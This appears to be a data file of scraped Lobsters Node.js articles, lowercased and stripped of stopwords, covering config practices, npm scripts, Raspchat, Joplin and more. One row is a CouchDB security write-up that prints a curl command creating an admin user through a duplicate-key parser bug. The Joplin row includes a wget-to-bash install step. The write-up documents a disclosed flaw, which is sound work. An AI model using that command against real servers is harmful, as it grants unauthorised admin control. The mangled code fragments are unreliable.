233,Lobsters,nodejs,Node.js programming,The State of Node.js & JavaScript for Backend Development,https://snipcart.com/blog/javascript-nodejs-backend-development,state nodejs javascript backend development,nodejs even j beginner gold mine controversy even sound poetic straightforward state nodejs backend nodejs javascript runtime built chrome j engine nodejs us eventdriven nonblocking io model make lightweight efficient widely popular developer survey npm angular react vue javascript nodejs notoriously difficult debug nodeinspector dtrace universal debugger ca nt use enterpriselevel server application javascript dynamic language nt get static pas compiler closure compiler javascript made serverside netscape built j browser javascript backend best node use case general advantage characteristic code universality across stack webpack javascript full stack browser server seamlessly use case realtime application immediate current use case single page application seo performance use case scalability even name emphasizes blog post nodejs backend limitation nodejs allows easily shoot foot ryan dahl go popular javascript backend tool mean stack expressjs nodejs framework meteor sailsjs koajs next generation web framework strapi keep eye nestjs hapijs socketio meanjs totaljs derbyjs keystonejs moving forward carefully think right tool share twitter,new technology made humble beginning vast universe backend development nodejs first legitimate attempt bring javascript serverside today hardpressed find web developer nt heard node even j beginner following inception split community triggered forum war brought many despair think sound dramatic quick google search land gold mine controversy argument stumble upon whatever happened axiom use best tool job javascript server side never best tool job even sound poetic callback hell real debugging bitch javascript made serverside straightforward nodejs cancer post thought time set record straight nodejs javascript backend language today going discus current state nodejs best use case limitation expect node moving forward state nodejs backend get let remind nodejs exactly javascript runtime built chrome j engine nodejs us eventdriven nonblocking io model make lightweight efficient know intro painted node developer nightmare truth become widely popular nt take word stack overflow developer survey show currently used technology developer also language fastest growing popularity last five year whereas language like c php losing steam javascript also way explain rapid shift original backlash mainstream acceptance nodejs javascript backend language put simply node outlived fad period entered solid maturity state built strong evergrowing community ecosystem around fact package manager npm largest software registry web nodejs revolutionized backend web development also contributed bringing performance frontend bringing serious engineering clientside also played part expansion overall javascript ecosystem improvement modern j framework angular react vue time proven wrong many preconception people early day javascript nodejs notoriously difficult debug leverage debugging experience frontend using nodeinspector package chrome native dev tool folk joyent also know thing two advanced node debugging profiling dtrace universal debugger released long time ago ca nt use enterpriselevel server application engineering achieved nodejs nt many builtin tool taking hand big player netflix paypal walmart yahoo used later javascript dynamic language nt get static pas compiler true however tool like typescript flow emerged provide kind language security google closure compiler also trick javascript made serverside well javascript already server time netscape built j browser back frontend typecast well took complete monopoly list go let jump best use case limitation get better idea node positioning javascript backend best node use case even consider nodejs backend stack general advantage characteristic let fire quicky highly probable assume already running frontend javascript case code universality across stack great advantage keep mind tool like webpack help reuse code end stay coherent across system level going javascript full stack write web app render browser server seamlessly exciting seen con nodejs arguing force choose javascript way entirely true still use right tool job granularly let say need video encoding wo nt go searching esoteric nodejs library simply call proven tool command line node already python library complex calculation require spawn microservice call function rest api make nodejs great following use case use case realtime application collaborative apps trello google doc livechat instantmessaging online gaming example rtas benefit nodejs architecture application function within time frame user sense immediate current nodejs specification solution lowlatency needed program work efficiently facilitates handling multiple client request enables reusing package library code data sync client server happens fast use case single page application spa web apps load single html page dynamically update page user interacts app much work happens client side javascript even though awesome evolution web development come problem come rendering negatively affect seo performance instance serverside rendering nodejs environment popular option solve use case scalability nodejs wo nt ever get bigger need beauty minimalist enough customize depending use case performancewise key even name emphasizes made assemble multiple small distributed node communicating node modularity allows create small apps without deal bloated overkill ecosystem choose tool need job scale needed scalability free complication though careful nodejs become dangerous nodejs ai nt bad ecommerce either see blog post nodejs backend limitation put bluntly nodejs allows easily shoot foot configuration customization come price inexperienced undisciplined might lose client contrary conventional approach create structure support backend involves lot decisionmaking meaning know going project scale language like ruby wellknown framework ruby rail instance used paradigm convention configuration traditional framework took developer hand shun light safe path nodejs go head heel freedom given developer road might get dark scary make wrong decision find callback hell real indeed nt mean ca nt build bigger server application always keep factor mind even creator nodejs ryan dahl eventually realized limitation system leaving work project transparent think node best system build massive server web would use go honestly reason left node realization oh actually best serverside system ever preconception mentioned earlier true one point nodejs short lifetime still extent matured grown enough able work around take time tool community offer enables pretty much anything popular javascript backend tool long ago thought putting together j full stack first thing came mind mean stack mongodb express angular node still relevant group tool today javascript ecosystem much offer frontend much backend ca nt limit popular javascript backend framework expressjs still popular nodejs framework fast unopinionated minimalist web framework evolved quickly made simple straightforward probably one closer nodejs basic idea lightweight system modularity approach meteor hand us pure javascript nodejs inside way bigger architecture meteor ecosystem may good building complex server application however use may become harder want something nt builtin sailsjs realtime mvc framework designed emulate mvc pattern ruby rail support modern apps requirement datadriven apis scalable serviceoriented architecture koajs crafted team behind express marketed next generation web framework nodejs smaller expressive robust foundation web application apis strapi nodejs api framework headless cm capability one quite new already proven one advanced nodejs content management framework wordofmouth pretty good one keep eye many explore drop real quick nestjs hapijs socketio meanjs totaljs derbyjs keystonejs moving forward point article get ultimate conclusion whether nodejs offer best backend environment tell use surely wo nt get say better popular backend language java c c php python go ruby guess aim paint grey area black white opinion reading nodejs javascript backend language whether like nodejs visibly stay nodejs interest time never think framework silver bullet magically resolve problem nodejs simply another tool immense universe web development get job done extremely well situation pain others every developer job carefully think right stack new project important know option write alternative getgo snipcart instance run net architecture also fair share naysayer choose right tool job moment time hoping overview help make mind node thought nodejs javascript backend language experience want share sure lot something say feel free startjoin discussion comment enjoyed post please take second share twitter
234,Lobsters,nodejs,Node.js programming,Node config best practices,http://codingsans.com/blog/node-config-best-practices,node config best practice,do t ci paas keep secret removing dotenv convict like provict sorry convict conclusion,building kind server side app eventually following thought would like bind app specific porti would like enter connection string connect databasei would like use thirdparty service provided api key credential given value kind parameter yield configuration crucial part system application lot configurable element must handled properly throughout codebase article look do t node config handling instead defining part config separate file strongly advised configjs file hold configuration centralized way help developer locate adjust config value much easily one centralized file ensures reusability config value also give quick insight project technologiesserviceslibraries used bad dbjs const mongoose require mongoose const host localhost const port const name db const connectionstring mongodb host port name mongooseconnect connectionstring appjs const express require express const app express const port applisten port configjs const config app port db host localhost port name db moduleexports config dbjs const mongoose require mongoose const config require config const db host port name config const connectionstring mongodb host port name mongooseconnect connectionstring appjs const express require express const config require config const app express applisten configappport config file also export separate variable hold value simple object custom depth level also give scope config element far perfect every time want change config value touch code overcome help environment variable testing would like change database one using development way able safely drop data mess development production yikes database right edit config file time would like run test make app aware currently set environment node nodeenv variable used commonly used environment development dev coding local machine production prod deployed live server test running unitintegration test much current environment retrieved processenvnodeenv configjs const env processenvnodeenv dev test const dev app port db host localhost port name db const test app port db host localhost port name test const config dev test moduleexports config env running test nodeenv set test used instead app aware environment however multiple developer working project machine setup differ also server deploying app environment variable goto solution kind problem aside creating environment specific configs also offer finegrained option mean element configuration manipulated environment variable default value provided work case configjs const env processenvnodeenv dev test const dev app port parseint processenvdevappport db host processenvdevdbhost localhost port parseint processenvdevdbport name processenvdevdbname db const test app port parseint processenvtestappport db host processenvtestdbhost localhost port parseint processenvtestdbport name processenvtestdbname test const config dev test moduleexports config env example john run test mongo db run docker port instead default explicitly setting testdbport john easily set system preference without code modification others connecting mongo db still work box environment variable also supported ci paas provider node config also easily set code verified build server deployed production environment one quick note every variable read processenv string thus type conversion needed sometimes parseint converting number adjust system individual configuration without code modification look good however need talk sensitive configuration keep secret value stored configjs available code repository putting default port app bind code really issue however login credential production database api key cool third party service big nono adding removing ideal way handle situation leave sensitive configuration variable blank code set environment variable system app running configjs const config coolthirdpartyapikey processenvcoolthirdpartyapikey moduleexports config terminal coolthirdpartyapikeysupersecret node entrypoint j course running app machine deploying server iaa every sensitive environment variable must set every time app started tedious however great tool help overcome problem dotenv great node library enables use env file hold environment variable feed node app gitignore env env coolthirdpartyapikeysupersecret configjs require dotenv config load defined variable env const config coolthirdpartyapikey processenvcoolthirdpartyapikey moduleexports config make sure stated example add env gitignore file else commit sensitive variable repository unwanted aside dotenv direnv cover article worth checking convict like provict sorry another node config helping library regularly use convict multiple benefit configurationbyhand approach define configuration schema type validation config variable custom validation port ip plug validator define environment variable config property env aware define switch property configured command line argument config value coming environment variable automatically cast desired type much configjs require dotenv config const convict require convict const config convict env format prod dev test default dev arg nodeenv env nodeenv apple format string default default arg apple env apple banana format string default default arg banana env banana cherry format string default default arg cherry env cherry const env configget env configloadfile config env json configvalidate allowed strict throw error config conform schema moduleexports configgetproperties operate plain old javascript object abstract away convict optional configprodjson banana prodjson env nodeenvprod terminal node indexjs cherry command line indexjs const config require config consolelog config env prod apple default banana prodjson cherry command line rather complex example take glimpse convict combined dotenv give u conclusion article given stepbystep guide build efficient configuration module node app principle also applied technology well key takeaway post following centralize app configuration single module enable config variable setting without code modification use environment variable expose secret configuration value afraid use thirdparty config library dotenv convict ease development
235,Lobsters,nodejs,Node.js programming,Moving away from Go to Node.js - Raspchat,https://github.com/maxpert/raspchat/releases/tag/v1.0.0-alpha,moving away go nodejs raspchat,simplicity complexity disclaimer totally love go nodejs go article go choose framework built raspchat raspchat well behaves single core machine limited memory documenting goroutines cheap raspchat gorilla websocket library code channel efficient need lot implementing pubsub first one discover disruptor pattern serialization union missing generic workarounds complexity gob serialization back white board note various exploration going back simplicity nt good stable production ready websocket server library yet boehm gc nodejs benchmark tcpkali conclusion,simplicity complexity disclaimer people think post like negative press golang trying bash golang look codebase history see experimental code playing go quite long time totally love go note choose nodejs go tldr find simpler convenient nodejs work well single core machine targeting nt find complexity goroutines channel back forth writing event system disruptor library worth people pointed many resource one common one article suffers maintaining event loop problem go performs nodejs come speed come write event loop choose framework built even begin explain reason let rewind jot list motivation building small system raspchat supposed plain simple dumbest chat system implementation modern browser inspires idea irc said nt want write something boilerplate cc still want maintain reasonable scale something primitive raspberry pi hence name raspchat rule remember well behaves single core machine limited memory started idea putting rotting rpi work mind three piece solve frontend backend protocol would talk protocol already started documenting anything close innovation repetition triedtested json message going across wire property carrying meaning time implementation looked available option golang efficiency hype made obvious choice go probably time nodejs something like go great choice implementation crosscompiles concept goroutines channel nothing new giant like google backing great assurance bright future however implementing system benchmarking carefully analyzing system realized right design choice scenario would say let look goroutines cheap let start biggest problem raspchat used gorilla websocket library obvious performance reason active connection library implement read write blocking method every library wild gorilla fault fully functioning full duplex server would need goroutines per client one constantly reading dedicated write going nitty gritty detail would need additional channel well get message go routine also signal stop etc typical house keeping stuff every go developer understands problem start calculate stack size required goroutines around begin taking anything else consideration yet paying cost upfront per connection already resource constrained system reality obviously due extra field look code embedded storage multiple channel every room membership synchronization construct like mutex everything overall cost way sound innocent paper ca nt get everything done go routine need communication mechanism lead next discovery channel efficient need lot implementing pubsub yes channel thread safe obviously come cost first one discover typical chat room scenario need implement publish subscribe pattern efficient datastructures pubsub looked various implementation implement pubsub system internally without paying cost many channel turn two option either run go routine invoking callback loop use channel fan message individual recipient used later one disappointed solution looked pattern like disruptor pattern mature implementation one recommends stay away use channel instead would rather spend energy solving problem hand may someday write go lang disruptor library well tested usable production serialization union missing generic workarounds complexity looking message protocol since decided go json design choice build plethora existing json parser property usually act like opcode effect shape payload totally different field might show different value fixed property payload coming server ie id god know thinking came name based value rest pay load requires different property one might msg might like http request header body since go generic union option right decode message base message struct json field based try decode message full payload struct price pay nt generic union system data dynamic shape rule applies message serialized storage etc also discovered later benchmark using gob serialization persist structure store faster speed gob huge memory hog back white board able get parallel connection rpi ram note includes everything including hn comment pointed poor choice boltdb system come crawl load go higher due thrashing memory swapping despite effort improving code performance rather readability getting much improvement except fact something wrong point kind stopped development asked wrong fair go part run system core laptop gb ram work extremely well faster anything else problem hit run resource constrained system accumulative memory usage brings whole thing wanted system handle connection cheap aws instance forget rpi various exploration going back simplicity started exploring various option ranging rust elixir crystal nodejs rust second choice nt good stable production ready websocket server library yet crystal dropped due conservative nature boehm gc elixir also used memory expected nodejs surprisingly gave nice balance memory usage speed new asyncawait syntax le annoying write reasonable code saying best code yet benchmark websockets writing basic pubsub server language load testing used tcpkali benchmark system continuous message load found nodejs right fit current system gracefully handle concurrent client sending message back forth single room imagine chatty people room memory usage including db everything else stay mb scientific benchmark already performs better go version load test intend scientific version later post result conclusion still calling refactoring frontend code clean well moving away vue hyper app jsx server code still rough edge development debt packaging code cleanup unit test etc server running nodejs server cheap vps cheapest could found far happy amount fat able cut result
237,Lobsters,nodejs,Node.js programming,grabity - Gets preview data from a link. Just grab it! (Node.js),https://github.com/e-oj/grabity,grabity get preview data link grab nodejs,grabity get preview data link grab open graph twitter card og twitter getting started usage api grabitygrabit url get title description image favicon url og twitter og twitter og twitter og og twitter grabitygrab url get og twitter tag value well favicon og twitter og twitter test,grabity get preview data link grab grabity look open graph twitter card markup get information link function return much data markup og twitter tag found default content title tag meta description either title tag meta description missing returned property empty getting started npm install grabity usage really quite simple let grabity require grabity async let await grabitygrabit http githubcomeojgrabity consolelog produce title eojgrabity description grabity get preview data link grab image http favicon http assetscdngithubcomfaviconico api grabitygrabit url get title description image favicon url url required url used return object containing title description image favicon found get og twitter title description image url well favicon return object og twitter tag exist property og tag given preference twitter tag selected og tag exist property tag og twitter property property included returned object let grabity require grabity async let await grabitygrabit http wwwflickrcom consolelog result title flickr yahoo company description flickr almost certainly best online photo management sharing application world show favorite photo video world securely privately show content friend family blog photo video take cameraphone image http favicon http syimgcompwfaviconico grabitygrab url get og twitter tag value well favicon url required url used return object containing found og twitter tag value favicon get existing og twitter tag well favicon markup return object let grabity require grabity async let tag await grabitygrab http wwwflickrcom consolelog tag result og sitename flickr og updatedtime og title flickr yahoo company og type website og description flickr almost certainly best online photo management sharing application world show favorite photo video world securely privately show content friend family blog photo video take cameraphone og image http twitter card summarylargeimage twitter creator flickr twitter title flickr yahoo company twitter description flickr almost certainly best online photo management sharing application world show favorite photo video world securely privately show content friend family blog photo video take cameraphone twitter image src http favicon http syimgcompwfaviconico test test module cd project directory run npm runscript testserver seperate terminal npm test note test server run port default change port number testsetupconfigjs
238,Lobsters,nodejs,Node.js programming,Remote Code Execution in CouchDB (and Privilege Escalation in the npm Registry),https://justi.cz/security/2017/11/14/couchdb-rce-npm.html,remote code execution couchdb privilege escalation npm registry,npm registry background code execution rubygemsorg registrynpmjsorg homepage couchdb vulnerability jiffy impact npm registrynpmjsorg check one registry validation doc github registrynpmjsorg custom authentication system since early skim database blog post conclusion specify behavior duplicate key shameless plug joining mastodon,tl dr vulnerability couchdb caused discrepancy database native json parser javascript json parser used document validation couchdb database meant exposed directly internet enabled privilege escalation ultimately remote code execution large number installation exploited bug could allowed modification arbitrary package npm registry edit wrong main npm registry unaffected see correction bad background last time wrote deserialization bug leading code execution rubygemsorg repository dependency ruby program ability inject malware upstream project dependency scary attack vector one doubt organization adequately protected mind started searching bug registrynpmjsorg server responsible distributing npm package according homepage npm registry serf billion package downloads per week couchdb npm registry us couchdb heard project basic idea nosql database make data replication easy sort like big keyvalue store json blob document feature data validation querying user authentication making closer fullfledged database couchdb written erlang allows user specify document validation script javascript script automatically evaluated document created updated start new process passed jsonserialized document erlang side couchdb manages user account special database called user create modify user couchdb database usually put usersorgcouchdbuser yourusername server check proposed change javascript validatedocupdate function ensure example attempting make administrator vulnerability problem discrepancy javascript json parser used validation script one used internally couchdb called jiffy check one deal duplicate key object like foo bar foo baz erlang jiffy decode foo bar foo baz foo bar foo baz javascript jsonparse foo bar foo baz foo baz given key erlang parser store value javascript parser store last one unfortunately getter function couchdb internal representation data return first value within couchutil getvalue list keysearch key list bypass relevant input validation create admin user thusly curl x put http oops databinary type user name oops role admin role password password erlang land see admin role javascript land appear special permission fortunately attacker almost important logic concerning authentication authorization aside input validation script occurs erlang part couchdb administrator account complete control database getting shell usually easy since couchdb let define custom queryserver language admin interface feature basically wrapper around execv one funny feature exploit slightly tricky detect web gui try examine user created admin console role field show empty since parsed javascript displayed impact npm trying figure exactly npm affected bug since actually exploit vulnerability npm production server make educated guess part infrastructure vulnerable part attack based publicly available information almost certain registrynpmjsorg vulnerable privilege escalationadmin account creation part attack would allowed attacker modify package user creation npm le identical vanilla couchdb user creation flow authenticating newly created admin user user context passed subsequent validation script admin role visible allowing u pas isadmin check one registry validation doc said far tell github production server provide route administrator configuration api meaning sure bug could enabled rce server edit turn registrynpmjsorg simply expose identical api couchdb user creation flow order maintain backwards compatibility old client using custom authentication system since early therefore vulnerable attack skim database mentioned affected bug however apologize completely wrong initial version blog post npm also expose skim database look like would vulnerable rce part attack unclear database used infrastructure today blog post indicates writes go skimdb know still true conclusion probably bad idea use one parser process data perhaps project us multiple language like couchdb best ensure functional difference parser like unfortunate json standard specify behavior duplicate key thanks couchdb team published security email address working quickly get fixed shameless plug interested ditching birdsite want use social network actually respect freedom consider joining mastodon federated social network meaning work distributed way sort like email join u fediverse help u build friendly security community
239,Lobsters,nodejs,Node.js programming,How to Use npm as a Build Tool (2014),https://www.keithcirkel.co.uk/how-to-use-npm-as-a-build-tool/,use npm build tool,stop using grunt gulp et al directive fish npm script shortcut script pre post hook passing argument npm least npm config variable directive window problem rimraf using multiple file minimatch glob running multiple task streaming multiple task autoprefixer cssmin version bumping clean rimraf compiling file unique name gulphash grunthash hashmark watch previous post mocha stylus nodesass jade karma watch onchange dirwatch nodemon parallelshell parallelshell parallelshell livereload livereload running task come binary favicon fairly complex config npmscriptsexample silence output npm conclusion keithamus,update frequently get asked considering post year old whether still stand advice post whether new developer use npm build tool advice still stand believe developer use npm build tool gulp grunt free since ever change stance immediately update post last month noted opinion stop using grunt gulp et al suggested start using npm instead npm script directive everything build tool succinctly elegantly le package dependency le maintainence overhead first draft original post way word went depth npm could used alternative removed brevity point post expressing opinion tutorial post however response pretty overwhelming many people replied telling build tool offer feature npm developer brazen enough present gruntfile say could done npm thought pull howtos original draft make new post focussing common task npm npm fantastic tool offer much meet eye become backbone nodejs community many including use pretty much every day fact looking bash history well fish history npm second git used command still find new feature npm every day course new one still developed aim making npm great package manager npm great subset functionality decidated running task facilitate package lifecycle word great tool build script npm script firstly need figure npm manage build script part npm core npm runscript command npm run short command dive packagejson pull script object first argument passed npm run refers property script object execute property value command operating system default shell usually bash except window get later let say packagejson config look like name myproject devdependencies jshint latest browserify latest mocha latest script lint jshint j test mocha test run npm run lint npm spawn shell run jshint j run npm run test npm spawn shell run mocha test shell environment nodemodulesbin folder added path mean dependency install binary runnable directly word need put nodemodulesbinjshint j npm bin jshint j run npm run without argument give list available command run like available script userservice package lint jshint j test mocha test npm run shell environment provides lot helpful feature make sure script succinct example shell path nodemodulesbin folder inside meaning dependency install binary called directly script shell also whole slew super convenient environment variable npm expose currently running task package name version npm loglevel find making script run env running like script env env shortcut script npm also provides convinient shortcut npm test npm start npm stop command shortcut run equivalent eg npm test shortcut npm run test shortcut useful reason common task project use nice type much time much importanlty provides standard interface within npm testing starting stopping package many ci tool travis take advantage behaviour making default command nodejs project npm test also make introducing new developer project breeze know simply run script like npm test without ever read doc pre post hook another cool feature npm script executed also set pre post hook simply definable script object example execute npm run lint despite npm preconceived idea lint task immediately run npm run prelint followed npm run lint followed npm run postlint true command including npm test npm run pretest npm run test npm run posttest pre post script also exitcodesensitive meaning pretest script exit nonzero exit code npm immediately stop run test posttest script pre pre script though prepretest get ignored npm also run pre post hook internal command install uninstall publish update override behaviour internal command affect behaviour pre post script mean cool stuff like script lint jshint j build browserify indexjs myprojectminjs test mocha test prepublish npm run build also run npm run prebuild prebuild npm run test also run npm run pretest pretest npm run lint passing argument another cool feature npm since npm least passing argument set underlying tool little complex example script test mocha test test xunit npm run test reporter xunit config simply run npm run test run mocha test extend custom parameter prefix example npm run test anothertestjs run mocha test anothertestjs usefully npm run test grep parser expand mocha test grep parser run test parser title packagejson test xunit effectively run mocha test reporter xunit setup incredibly useful composing command together advanced configuration npm config variable one last thing worth mentioning npm config directive packagejson let set arbitrary value picked environment variable script example name fooproject config reporter xunit script test mocha test reporter npmpackageconfigreporter test dev npm run test fooproject reporterspec config object reporter property set xunit config option exposed environment variable prefixed npmpackageconfig admittedly make variable name mouthful example npm run test command us npmpackageconfigreporter variable get expanded mocha test reporter xunit get replaced two convinient way like test dev task change reporter config variable spec using fooproject reporter replace fooproject project name reporter config variable override also overriden part user config running npm config set fooproject reporter spec entry npmrc appears fooproject reporterspec read runtime override npmpackageconfigreporter variable meaning local machine forever npm run test get expanded mocha test reporter spec remove personalised setting using npm config delete fooproject mochareporter good set sensible default packagejson customisations tucked away inside npmrc totally honest love way work setup seems trivial config object json trying use seems verbose complicated would also like simpler way override package configs without specifying package name awesome standard convention could come place could set favourite mocha reporter package npmrc downside configs window friendly window us variable substitution bash us work fine use within nodejs script anyone know way get working window via shell command let know window problem let get something way progress npm reliant operating system shell run script command quickly become unportable linux solaris bsd mac osx come preinstalled bash default shell window window npm resort using window command prompt thing frankly le problem seems good chunk syntax work bash also work window command prompt way chaining task running task simaltaneously inputting content stdin file command redirecting output stdout command dumping file redirecting output stdout command sending another command biggest problem two availability naming command eg cp copy window variable window us variable bash feel like completely surmountable problem rather relying built command could simply use alternative example instead using rm use npm rimraf package rather trying use syntax cross compatible stick one surprised much get done variable sucker anyway ok let get brass tack post want replace build tool like grunt gulp need likeforlike replacement plugins feature tool taken popular task paradigm various project question commenters last post demonstrated npm using multiple file people responding last post saying benefit task runner ability handle multiple file task using file glob look like j mincss asset feature actually inspired bash turn inspired glob command unix shell automatically look command line argument j expand star wildcards using two star allows search recursively mac linux machine try opening shell playing try something like l j problem herein lie course window command line functionality luckily given command line argument like j window pass verbatum application meaning tool vendor install compatibility library give window glob like functionality many many tool npm two popular glob library minimatch glob share dependent including jshint jscs mocha jade stylus list go mean use file glob within npm script like devdependencies jshint latest script lint jshint j running multiple task grunt gulp etc capability tying multiple task together make one single task typically useful building testing npm two option depending one semantically right fit either use pre post hook good fit task prerequisite thing ie concating j minfiying use bash operator like devdependencies jshint latest stylus latest browserify latest script lint jshint build cs stylus assetsstylesmainstyl distmaincss build j browserify assetsscriptsmainjs distmainjs build npm run build cs npm run build j prebuild j npm run lint example build execute build cs build j running lint task using pattern also run build cs build j task separately build j also run lint beforehand task composed chained like much like window compatible streaming multiple task one gulp biggest feature stream output seamlessly one task next opposed grunt constantly dip filesystem bash window command line pipe operator stream one command output stdout send another command input stdin let say want run cs first autoprefixer cssmin output file using operator output stdout given file devdependencies autoprefixer latest cssmin latest script build cs autoprefixer b last version assetsstylesmaincss cssmin distmaincss see autoprefixer add cs vendor prefix cs piped cssmin minifies output whole thing get dumped distmaincss good tool support stdin stdout code fully compatible window mac linux version bumping version bumping popular grunt gulp task effectively increment version number one inside packagejson make git commit tag said commit actually come baked npm package manager simply run npm version patch increment patch number eg npm version minor increment minor version number eg npm version major eg commit tag package left git push npm publish fully customised example want running git tag simply run gittagversionfalse flag set permanently npm config set gittagversion false want configure commit message simply run flag eg npm version patch bumped set permanently npm config set message bumped even get sign tag running signgittagtrue flag set permanently npm config set signgittag true clean many build runner come clean task task usually remove bunch file start fresh working copy start building well turn bash pretty good clean command rm passing r recursive flag let rm remove directory simpler script clean rm r dist really need window support support rm luckily rimraf crosscompatible tool thing devdependencies rimraf latest script clean rimraf dist compiling file unique name effectively trying replace functionality gulphash grunthash take input j name hash content one turned really complex using existing command line tool look npm see anything fit bill wrote one hear gruntgulp proponent telling cheated already two point firstly pretty disappointing see lot siloed effort various plugin author generic solution work build tool secondly find something fit write hashmark library clock around line code gruntgulp version similar better featureset depending plugin mine even support streaming going back autoprefixer example output file specific hash using pipe devdependencies autoprefixer latest cssmin latest script build cs autoprefixer b assetsstylesmaincss cssmin hashmark l distmain cs ouput build cs ouput file dist named hash watch definitely popular reason people using gruntgulp far requested example comment around previous post lot build tool come command watching filesystem detecting change file eg saving reloading serverrecompiling assetsrerunning test useful rapid development seems like developer replying last post simply assumed option outside gruntgulp perhaps thought something difficult without well tool facilitate option usually much tune intricacy file listened example mocha w option stylus nodesass jade karma others could use option like devdependencies mocha latest stylus latest script test mocha test test watch npm run test w cs stylus assetsstylesmainstyl distmaincss cs watch npm run cs w course tool support even might want compose multiple compile target one task watch change run whole set tool watch file execute command file change example watch onchange dirwatch even nodemon devdependencies stylus latest jade latest browserify latest watch latest script build j browserify assetsscriptsmainjs distmainjs build cs stylus assetsstylesmainstyl distmaincss build html jade assetshtmlindexjade distindexhtml build npm run build j npm run build cs npm run build html build watch watch npm run build go pretty painless line json watch whole project directory build html cs j asset every time file change run npm run build watch start developing could even optimise little tool wrote writing post parallelshell keep multiple process running one time little like devdependencies stylus latest jade latest browserify latest watch latest parallelshell latest script build j browserify assetsscriptsmainjs distmainjs watch j watch npm run build j assetsscripts build cs stylus assetsstylesmainstyl distmaincss watch cs watch npm run build cs assetsstyles build html jade indexjade distindexhtml watch html watch npm run build html assetshtml build npm run build j npm run build cs npm run build html build watch parallelshell npm run watch j npm run watch cs npm run watch html running npm run build watch run individual watcher parallelshell example change cs cs recompile change j j recompile parallelshell combine output stdout stderr task listen exit code ensure log failed build propagate unlike bashwindows operator livereload livereload another popular one know livereload combination command line tool browser extension custom server file change livereload trigger page looking reload meaning never press refresh npm package livereload pretty suitable command line client run server serf j file include page notify page change simple yet effective example get working devdependencies livereload latest script livereload livereload port dist html file script src script running npm run livereload visit html page start listening livereload server change file dist directory notifiy client page reloaded running task come binary pointed libs come binary favicon gruntgulp plugins useful wrap tool used within task runner find package want use binary simply write javascript would using grunt gulp afraid chuck bit javascript somewhere wire even better submit pr maintainer convincing support command line interface scriptsfaviconjs var favicons require favicons var path require path favicons source pathresolve assetsimageslogopng dest pathresolve dist devdependencies favicons latest script build favicon node scriptsfaviconjs fairly complex config previous post many telling missing point task runner wiring complex set task running odd task thought wrap piece complex set task typical multihundredline gruntfile example want following take j lint test compile versioned file separate sourcemap upload compile stylus cs single versioned file separate sourcemap upload add watcher testing compilation add static file server see single page app web browser add livereload cs j task combine file type one command spin environment bonus point open browser window automagically pointing website chucked simple repository github called npmscriptsexample contains layout basic website packagejson fit task line probably interested script clean rimraf dist prebuild npm run clean build npm run build script npm run build style npm run build markup build script browserify assetsscriptsmainjs p minifyify compresspath map mainjsmap output distmainjsmap hashmark n distmainjs l assetsjson dist name hash ext build style stylus assetsstylesmainstyl dist hashmark l assetsjson distmaincss dist name hash ext build markup jade assetsmarkupindexjade obj assetsjson dist test karma start singlerun watch parallelshell npm run watch test npm run watch build watch test karma start watch build nodemon q w asset ext exec npm run build open prod opener http examplecom open stage opener http stagingexampleinternal open dev opener http deploy prod sync dist examplecomprodsite deploy stage sync dist examplecomstagesite serve httpserver p dist livereload livereload port dist dev npm run open dev parallelshell npm run livereload npm run serve npm run watch wondering flag silence output npm task cleaning log output try disabling see difference equivalent grunt take gruntfile hundred line plus finger air estimate around extra dependency certainly subjective version would readable npm certainly holy grail readability personally think npm script directive easier reason ie see task glance conclusion hopefully article show capable npm build tool hopefully demonstrated tool like gulp grunt always first thing jump project tool probably already system worth investigating always feel free discus twitter keithamus follow apparently
240,Lobsters,nodejs,Node.js programming,"Joplin, a note taking and to-do app for the terminal",http://joplin.cozic.net/,joplin note taking todo app terminal,joplin markdown format imported synchronised nextcloud web clipper firefox chrome installation desktop mobile terminal desktop application portable version portable application also available mobile application terminal application wsl important install node joplin terminal application documentation unsupported method chaoticaur github repo web clipper web clipper help page sponsor feature web clipper importing importing evernote recognition data desktop application terminal application commandline mode importing markdown file desktop application terminal application commandline mode importing application exporting synchronisation nextcloud synchronisation nextcloud desktop application mobile application make sure create joplin directory nextcloud see explanation terminal application dropbox synchronisation desktop application mobile application terminal application webdav synchronisation onedrive synchronisation desktop application mobile application terminal application encryption endtoend encryption tutorial encryption specification note history announcement post external text editor attachment desktop application note history important downloading attachment notification window macos linux documentation flow chart reporter choice open issue subnotebooks desktop application mobile application terminal app markdown markdown guide custom cs must note template desktop app momentjs searching simple ft query fulltext index query exact term end goto anything privacy joplin forum donation donation page community contributing http localisation new translation download poedit download file translated open pull request update translation contributor known bug license,joplin free open source note taking todo application handle large number note organised notebook note searchable copied tagged modified either application directly text editor note markdown format note exported evernote via enex file imported joplin including formatted content converted markdown resource image attachment etc complete metadata geolocation updated time created time etc plain markdown file also imported note synchronised various cloud service including nextcloud dropbox onedrive webdav file system example network directory synchronising note notebook tag metadata saved plain text file easily inspected backed moved around application available window linux macos android io terminal app also work freebsd web clipper save web page screenshots browser also available firefox chrome three type application available desktop window macos linux mobile android io terminal window macos linux freebsd application similar user interface synchronise desktop operating system download alternative window get portable versionthe portable application allows installing software portable device usb key simply copy file joplinportableexe directory usb key application create directory called joplinprofile next executable file macos also use homebrew unsupported brew cask install joplin linux arch linux package unsupported also availableif work distribution tested ubuntu fedora mint desktop environment supported gnome kde xfce mate lxqt lxde unity cinnamon deepin pantheon recommended way use script handle desktop icon wget http bash mobile operating system download alt download android download apk file io terminal operating system method macos linux window via wsl important first install node npm install g joplinsudo ln joplinbinbinjoplin usrbinjoplinby default application binary installed joplinbin may change directory needed alternatively npm permission setup described option simply running npm g install joplin would work start type joplin usage information please refer full joplin terminal application documentation unsupported way install terminal application however supported problem must reported upstream project operating system method macos brew install joplin arch linux arch linux package available install use aur wrapper yay yay joplin cli tool type joplin desktop app type joplindesktop packaged also install compiled version chaoticaur repository support please go github repo web web clipper browser extension allows save web page screenshots browser information install use see web clipper help page desktop mobile terminal application web clipper firefox chrome end end encryption note history revision synchronisation various service including nextcloud dropbox webdav onedrive import enex file evernote export format markdown file export jex file joplin export format raw file support note todos tag notebook goto anything feature sort note multiple criterion title updated time etc support alarm notification mobile desktop application offline first entire data always available device even without internet connection markdown note rendered image formatting desktop mobile application support extra feature math notation checkboxes file attachment support image displayed file linked opened relevant application search functionality geolocation support support multiple language external editor support open note favorite external editor one click joplin importing joplin designed replacement evernote import complete evernote notebook well note tag resource attached file note metadata author geolocation etc via enex file term data two thing might slightly differ recognition data evernote image particular scanned photographed document recognition data associated text evernote able recognise document data preserved note imported joplin however become supported search tool part joplin possible regenerate recognition data since actual image would still available colour font size face evernote text stored html converted markdown import process note mostly plain text basic formatting bold italic bullet point link etc lossless conversion note rendered back html similar table also imported converted markdown table complex note formatting data might lost particular colour font size font face imported text however always imported 